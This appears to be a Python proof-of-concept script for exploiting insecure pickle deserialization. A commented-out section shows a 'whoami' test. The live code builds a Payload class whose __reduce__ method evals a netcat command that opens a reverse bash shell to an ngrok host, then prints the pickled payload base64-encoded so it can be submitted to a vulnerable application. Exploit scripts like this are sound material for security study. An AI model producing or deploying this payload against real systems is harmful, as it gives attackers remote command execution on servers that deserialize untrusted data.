import pickle
import os
from base64 import b64encode, b64decode
# class BadUserClass():
#     def __init__(self, username):
#         self.username = username
#         def __reduce__(self):
#             return (self.__class__, (os.system("whoami"),))

# bad_user_obj = BadUserClass("ayush")
# serialized_obj = pickle.dumps(bad_user_obj)
# print(b64encode(serialized_obj))
# Insecure deserialization
# user = pickle.loads(serialized_obj)
# print("Hello!, {}".format(user.username))


class Payload(object):
    def __reduce__(self):
        return (eval, ("os.system('nc 0.tcp.in.ngrok.io 14072 -e /bin/bash')",) )


deserializedPayload = Payload()
serializedPayload = pickle.dumps(deserializedPayload)

pay = b64encode(serializedPayload)
print(pay)